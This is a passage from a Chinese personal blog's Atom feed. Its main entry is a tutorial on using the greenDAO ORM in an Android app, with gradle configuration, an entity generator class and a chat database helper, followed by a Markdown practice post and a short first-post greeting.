<p>上边这张图说明了greenDAO的作用，greenDAO用来帮助我们的工程生成Java Objects和访问数据库的DAO类，其中Java Objects中的属性字段和SQLite Database里的表的列属性一一对应。生成Java Objects和DAO类后，应用程序Android App可以通过使用DAO类来进行增删查改的数据库操作，操作方法全都是基于Java Objects的，不用写sql语句。</p>

<p>这里涉及了两个工程，DAOGenerator工程和Android App工程。前者用于生成Java Objects和DAO类，后者是开发者的应用工程，使用前者生成的类。</p>

<p>下边就以我做的项目来举例，两个工程的目录结构如下所示</p>

<p>|&ndash;PmdCampus<br/>
&nbsp;&nbsp;&nbsp;&nbsp;|&ndash;src  <br/>
&nbsp;&nbsp;&nbsp;&nbsp;|&ndash;src-gen        <br/>
|&ndash;PmdCampusDAOGenerator</p>

<p>PmdCampusDAOGenerator是生成DAO类的独立Java工程，PmdCampus是应用开发者的Android App工程。</p>

<p>如果是用gradle来编译的话，PmdCampusDAOGenerator工程的build.gradle文件如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">apply</span> <span class="nl">plugin:</span> <span class="err">&#39;</span><span class="n">java</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">apply</span> <span class="nl">plugin:</span> <span class="err">&#39;</span><span class="n">application</span><span class="err">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">dependencies</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">compile</span> <span class="nf">fileTree</span><span class="o">(</span><span class="nl">dir:</span> <span class="err">&#39;</span><span class="n">libs</span><span class="err">&#39;</span><span class="o">,</span> <span class="nl">include:</span> <span class="o">[</span><span class="err">&#39;</span><span class="o">*.</span><span class="na">jar</span><span class="err">&#39;</span><span class="o">])</span>
</span><span class='line'>    <span class="n">compile</span> <span class="err">&#39;</span><span class="n">de</span><span class="o">.</span><span class="na">greenrobot</span><span class="o">:</span><span class="n">greendao</span><span class="o">-</span><span class="nl">generator:</span><span class="mf">1.3</span><span class="o">.</span><span class="mi">1</span><span class="err">&#39;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>其中<code>compile 'de.greenrobot:greendao-generator:1.3.1'</code>这行是引入greenDAO的库。</p>

<p>再来看下PmdCampus工程的build.gradle，由于太多其它内容，这里只贴出关键的部分。需要引入以下库</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">compile</span> <span class="err">&#39;</span><span class="n">de</span><span class="o">.</span><span class="na">greenrobot</span><span class="o">:</span><span class="nl">greendao:</span><span class="mf">1.3</span><span class="o">.</span><span class="mi">7</span><span class="err">&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>大家注意PmdCampus下除了常规的src目录外，还有一个手工创建的src-gen目录，这个目录就是存放PmdCampusDAOGenerator工程生成的Java Objects和DAO类的。所以，PmdCampus的build.gradle文件配置一下，编译src-gen里的java文件，需要加入以下的配置：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">sourceSets</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">main</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">java</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">srcDir</span> <span class="err">&#39;</span><span class="n">src</span><span class="err">&#39;</span>
</span><span class='line'>            <span class="n">srcDir</span> <span class="err">&#39;</span><span class="n">src</span><span class="o">-</span><span class="n">gen</span><span class="err">&#39;</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>2. 在DAOGenerate工程创建DAOGenerator类</h2>

<p>DAOGenerate工程是一个普通的Java工程，DAOGenerator类是用来生成DAO文件的类，有main函数入口，直接从main函数运行就可以了。DAOGenerator类的代码如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">package</span> <span class="n">com</span><span class="o">.</span><span class="na">example</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">de.greenrobot.daogenerator.DaoGenerator</span><span class="o">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">de.greenrobot.daogenerator.Entity</span><span class="o">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">de.greenrobot.daogenerator.Schema</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DAOGenerator</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">Schema</span> <span class="n">schema</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Schema</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="s">&quot;com.tencent.PmdCampus.module.message.dao&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="n">addChat</span><span class="o">(</span><span class="n">schema</span><span class="o">);</span>
</span><span class='line'>        <span class="k">new</span> <span class="nf">DaoGenerator</span><span class="o">().</span><span class="na">generateAll</span><span class="o">(</span><span class="n">schema</span><span class="o">,</span> <span class="s">&quot;./PmdCampus/src-gen&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">addChat</span><span class="o">(</span><span class="n">Schema</span> <span class="n">schema</span><span class="o">){</span>
</span><span class='line'>        <span class="n">Entity</span> <span class="n">chat</span> <span class="o">=</span> <span class="n">schema</span><span class="o">.</span><span class="na">addEntity</span><span class="o">(</span><span class="s">&quot;Chat&quot;</span><span class="o">);</span>
</span><span class='line'><span class="c1">//        chat.setTableName(&quot;ChatAnotherTableName&quot;);       //可以设置sqlite中的table name，默认跟Entity的名字相同</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addIdProperty</span><span class="o">().</span><span class="na">primaryKey</span><span class="o">().</span><span class="na">autoincrement</span><span class="o">();</span>  <span class="c1">// 消息唯一ID</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addIntProperty</span><span class="o">(</span><span class="s">&quot;conversationId&quot;</span><span class="o">).</span><span class="na">notNull</span><span class="o">();</span>   <span class="c1">// 聊天会话ID</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addIntProperty</span><span class="o">(</span><span class="s">&quot;type&quot;</span><span class="o">).</span><span class="na">notNull</span><span class="o">();</span>              <span class="c1">// 消息类型，1文字，2图片</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addStringProperty</span><span class="o">(</span><span class="s">&quot;senderId&quot;</span><span class="o">).</span><span class="na">notNull</span><span class="o">();</span>        <span class="c1">// 发送人唯一标识</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addStringProperty</span><span class="o">(</span><span class="s">&quot;receiverId&quot;</span><span class="o">).</span><span class="na">notNull</span><span class="o">();</span>      <span class="c1">// 接收人唯一标识</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addStringProperty</span><span class="o">(</span><span class="s">&quot;content&quot;</span><span class="o">).</span><span class="na">notNull</span><span class="o">();</span>        <span class="c1">// 消息内容，1文字内容，2图片url</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addLongProperty</span><span class="o">(</span><span class="s">&quot;send_time&quot;</span><span class="o">).</span><span class="na">notNull</span><span class="o">();</span>        <span class="c1">// 消息发送的时间</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addIntProperty</span><span class="o">(</span><span class="s">&quot;status&quot;</span><span class="o">).</span><span class="na">notNull</span><span class="o">();</span>            <span class="c1">// 消息是否发送成功（0表示成功或已读， 1表示失败, 2表示正在发送, 3表示未读）</span>
</span><span class='line'>        <span class="n">chat</span><span class="o">.</span><span class="na">addLongProperty</span><span class="o">(</span><span class="s">&quot;seq&quot;</span><span class="o">).</span><span class="na">notNull</span><span class="o">();</span>              <span class="c1">// 服务端有序的序号</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>在main方法中</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">Schema</span> <span class="n">schema</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Schema</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="s">&quot;com.tencent.PmdCampus.module.message.dao&quot;</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>该方法第一个参数用来更新数据库版本号，第二个参数为要生成的DAO类所在包路径。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">addChat</span><span class="o">(</span><span class="n">schema</span><span class="o">);</span>
</span><span class='line'><span class="k">new</span> <span class="nf">DaoGenerator</span><span class="o">().</span><span class="na">generateAll</span><span class="o">(</span><span class="n">schema</span><span class="o">,</span> <span class="s">&quot;./PmdCampus/src-gen&quot;</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>进行建表和设置要生成DAO文件的目标工程的项目路径。addChat方法里定义了Chat对象的属性，数据库中的字段也会一一对应。</p>

<p>之后运行main函数，就会在PmdCampus/src-gen目录下生成Java Objects和DAO类了。
<img src="http://i3.tietuku.com/d85c5423440290ca.png" alt="" /></p>

<h2>3. 在Android App工程里创建DBHelper类</h2>

<p>生成了DAO类之后，在自己的Android App工程就可以使用了，为了更加方便，这里封装了一个DBHelper类，代码如下</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">package</span> <span class="n">com</span><span class="o">.</span><span class="na">tencent</span><span class="o">.</span><span class="na">PmdCampus</span><span class="o">.</span><span class="na">module</span><span class="o">.</span><span class="na">message</span><span class="o">.</span><span class="na">storage</span><span class="o">.</span><span class="na">db</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">android.content.Context</span><span class="o">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">android.util.Log</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">com.tencent.PmdCampus.module.message.dao.Chat</span><span class="o">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">com.tencent.PmdCampus.module.message.dao.ChatDao</span><span class="o">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">com.tencent.PmdCampus.module.message.dao.DaoMaster</span><span class="o">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">com.tencent.PmdCampus.module.message.dao.DaoSession</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">de.greenrobot.dao.query.DeleteQuery</span><span class="o">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">de.greenrobot.dao.query.QueryBuilder</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/**</span>
</span><span class='line'><span class="cm"> * Created by junshao on 15/7/26.</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ChatDBHelper</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="n">Context</span> <span class="n">mContext</span><span class="o">;</span>
</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="n">ChatDBHelper</span> <span class="n">instance</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="n">ChatDao</span> <span class="n">chatDao</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">ChatDBHelper</span> <span class="nf">getInstance</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">instance</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="n">instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ChatDBHelper</span><span class="o">();</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">mContext</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>            <span class="o">{</span>
</span><span class='line'>                <span class="n">mContext</span> <span class="o">=</span> <span class="n">context</span><span class="o">;</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">DaoMaster</span><span class="o">.</span><span class="na">OpenHelper</span> <span class="n">helper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DaoMaster</span><span class="o">.</span><span class="na">DevOpenHelper</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">&quot;message.db&quot;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span><span class='line'>            <span class="n">DaoMaster</span> <span class="n">daoMaster</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">DaoMaster</span><span class="o">(</span><span class="n">helper</span><span class="o">.</span><span class="na">getWritableDatabase</span><span class="o">());</span>
</span><span class='line'>            <span class="n">DaoSession</span> <span class="n">daoSession</span> <span class="o">=</span> <span class="n">daoMaster</span><span class="o">.</span><span class="na">newSession</span><span class="o">();</span>
</span><span class='line'>            <span class="n">chatDao</span> <span class="o">=</span> <span class="n">daoSession</span><span class="o">.</span><span class="na">getChatDao</span><span class="o">();</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">instance</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">insertChat</span><span class="o">(</span><span class="n">Chat</span> <span class="n">chat</span><span class="o">){</span>
</span><span class='line'>        <span class="n">chatDao</span><span class="o">.</span><span class="na">insert</span><span class="o">(</span><span class="n">chat</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">delChat</span><span class="o">(</span><span class="kt">long</span> <span class="n">id</span><span class="o">){</span>
</span><span class='line'>        <span class="n">chatDao</span><span class="o">.</span><span class="na">deleteByKey</span><span class="o">(</span><span class="n">id</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">delAllChat</span><span class="o">(){</span>
</span><span class='line'>        <span class="n">chatDao</span><span class="o">.</span><span class="na">deleteAll</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">Chat</span><span class="o">&gt;</span> <span class="nf">queryChatList</span><span class="o">(</span><span class="kt">long</span> <span class="n">seq</span><span class="o">){</span>
</span><span class='line'>        <span class="n">QueryBuilder</span> <span class="n">qb</span> <span class="o">=</span> <span class="n">chatDao</span><span class="o">.</span><span class="na">queryBuilder</span><span class="o">();</span>
</span><span class='line'>        <span class="n">qb</span><span class="o">.</span><span class="na">where</span><span class="o">(</span><span class="n">ChatDao</span><span class="o">.</span><span class="na">Properties</span><span class="o">.</span><span class="na">Seq</span><span class="o">.</span><span class="na">le</span><span class="o">(</span><span class="n">seq</span><span class="o">));</span>
</span><span class='line'>        <span class="n">qb</span><span class="o">.</span><span class="na">orderDesc</span><span class="o">(</span><span class="n">ChatDao</span><span class="o">.</span><span class="na">Properties</span><span class="o">.</span><span class="na">Seq</span><span class="o">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">qb</span><span class="o">.</span><span class="na">list</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>ChatDBHelper是一个单例，主要负责初始化ChatDao对象，然后利用ChatDao就可以用操作对象的方式直接操作DB了。queryChatList里用到了QueryBuilder，QueryBuilder可以设置诸多属性，这里用到了where和orderDesc，相当于对应的sql语句。关于API更多的使用说明可以参考<a href="http://greendao-orm.com/">greenDAO官方网站</a>。</p>

<h2>4. 在业务逻辑里使用DBHelper类</h2>

<p>现在可以愉快方便的使用DBHelpler类了，生成一个Chat对象并插入，然后查询的代码如下:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">ChatDBHelper</span> <span class="n">chatDBHelper</span> <span class="o">=</span> <span class="n">ChatDBHelper</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
</span><span class='line'><span class="n">Chat</span> <span class="n">chat</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Chat</span><span class="o">();</span>
</span><span class='line'><span class="n">chat</span><span class="o">.</span><span class="na">setConversationId</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span><span class='line'><span class="n">chat</span><span class="o">.</span><span class="na">setType</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span><span class='line'><span class="n">chat</span><span class="o">.</span><span class="na">setSenderId</span><span class="o">(</span><span class="s">&quot;111&quot;</span><span class="o">);</span>
</span><span class='line'><span class="n">chat</span><span class="o">.</span><span class="na">setReceiverId</span><span class="o">(</span><span class="s">&quot;111&quot;</span><span class="o">);</span>
</span><span class='line'><span class="n">chat</span><span class="o">.</span><span class="na">setContent</span><span class="o">(</span><span class="s">&quot;content&quot;</span><span class="o">);</span>
</span><span class='line'><span class="n">chat</span><span class="o">.</span><span class="na">setStatus</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'><span class="n">chat</span><span class="o">.</span><span class="na">setSeq</span><span class="o">(</span><span class="mi">111</span><span class="o">);</span>
</span><span class='line'><span class="n">chatDBHelper</span><span class="o">.</span><span class="na">insertChat</span><span class="o">(</span><span class="n">chat</span><span class="o">);</span>
</span><span class='line'><span class="n">List</span><span class="o">&lt;</span><span class="n">Chat</span><span class="o">&gt;</span> <span class="n">chatList</span> <span class="o">=</span> <span class="n">chatDBHelper</span><span class="o">.</span><span class="na">queryChatList</span><span class="o">(</span><span class="mi">111</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>这篇文章只是简单的介绍了greenDAO的入门用法，更多高级内容请参考官方网站。</p>

<hr />

<p>参考资料：<br/>
*  <a href="http://greendao-orm.com/">greenDAO – Android ORM for SQLite</a> <br/>
*  <a href="http://glblong.blog.51cto.com/3058613/1354953">Android开源：数据库ORM框架GreenDao学习心得及使用总结</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Markdown学习]]></title>
    <link href="http://jason5.cn/blog/markdownxue-xi.html"/>
    <updated>2015-07-21T22:14:36+08:00</updated>
    <id>http://jason5.cn/blog/markdownxue-xi</id>
    <content type="html"><![CDATA[<h1>这是H1</h1>

<h2>这是H2</h2>

<h3>这是H3</h3>

<!--more-->


<blockquote><p>这是一段引用</p>

<blockquote><p>这是引用内的引用哈哈</p></blockquote></blockquote>

<h3>无序列表</h3>

<ul>
<li>Red</li>
<li>Green</li>
<li>Blue</li>
</ul>


<h3>有序列表</h3>

<ol>
<li>Bird</li>
<li>McHale</li>
<li>Parish</li>
</ol>


<h3>代码</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;hello&quot;</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">a</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span><span class="o">++){</span>
</span><span class='line'>  <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;test&quot;</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>代码嵌入文字</h3>

<p>Use the <code>printf()</code> function.</p>

<h3>分割线</h3>

<hr />

<h3>文字链接</h3>

<p><a href="http://www.baidu.com" title="baidu title">点我</a></p>

<p><a href="http://example.com/" title="Optional Title Here">foo</a></p>

<h3>隐式链接标记</h3>

<p>I get 10 times more traffic from <a href="http://google.com/" title="Google">Google</a> than from
<a href="http://search.yahoo.com/" title="Yahoo Search">Yahoo</a> or <a href="http://search.msn.com/" title="MSN Search">MSN</a>.</p>

<h3>参考式链接</h3>

<p>I get 10 times more traffic from <a href="http://google.com/" title="Google">Google</a> than from
<a href="http://search.yahoo.com/" title="Yahoo Search">Yahoo</a> or <a href="http://search.msn.com/" title="MSN Search">MSN</a>.</p>

<h3>强调</h3>

<p><strong>single asterisks</strong>
un<em>frigging</em>believable</p>

<h3>图片</h3>

<p><img src="http://www.baidu.com/img/bdlogo.png" alt="" /></p>

<h3>图片链接</h3>

<p><a href="http://www.baidu.com"><img src="http://www.baidu.com/img/bdlogo.png" alt="" /></a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hello World第一篇]]></title>
    <link href="http://jason5.cn/blog/hello-world.html"/>
    <updated>2015-07-21T12:26:37+08:00</updated>
    <id>http://jason5.cn/blog/hello-world</id>
    <content type="html"><![CDATA[<p>哈哈，我的“你好，世界”<br/>
终于建好了我的博客，参考了这篇文章，写得很好很详细，感谢作者。<br/>
注：用 Octopress + Github Pages构建博客是不需要自己准备服务器的哦，这点就完爆WordPress了。
<a href="http://shengmingzhiqing.com/blog/setup-octopress-with-github-pages.html/">Octopress 搭建流程 – Github Pages</a></p>
]]></content>
  </entry>
  
</feed>
